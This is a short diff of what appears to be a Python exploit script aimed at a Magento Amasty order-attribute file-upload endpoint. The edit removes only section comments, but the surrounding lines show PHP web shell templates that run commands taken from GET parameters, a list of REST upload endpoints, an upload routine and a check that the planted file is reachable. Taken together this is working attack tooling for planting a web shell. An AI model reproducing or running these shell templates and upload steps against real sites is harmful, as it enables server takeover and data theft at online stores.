@@ -16,7 +16,6 @@ POC_FILENAME = "poc.txt"
 POC_CONTENT = "this system is vulnerable!"
 POC_B64 = base64.b64encode(POC_CONTENT.encode()).decode()
 
-# ========== PARTE 1 - SHELL TEMPLATES ==========
 SHELL_TEMPLATES = [
     ("sys_c", "<?php system($_GET['c'].' 2>&1'); ?>"),
     ("exec_cmd", "<?php exec($_GET['cmd'], $o); echo implode('\\n', $o); ?>"),
@@ -77,7 +76,6 @@ ENDPOINTS = [
     "/rest/default/V1/amasty_orderattr/uploadFile",
 ]
 
-# ========== PARTE 2 - FUNÇÕES AUXILIARES ==========
 def get_expected_paths(filename):
     base = filename.lower()
     if len(base) >= 2:
@@ -115,7 +113,6 @@ def upload_file(target, filename, content_b64):
             continue
     return False
 
-# ========== PARTE 3 - VERIFICAÇÃO ==========
 def verify_file(target, filename):
     for path in get_expected_paths(filename):
         url = target + path
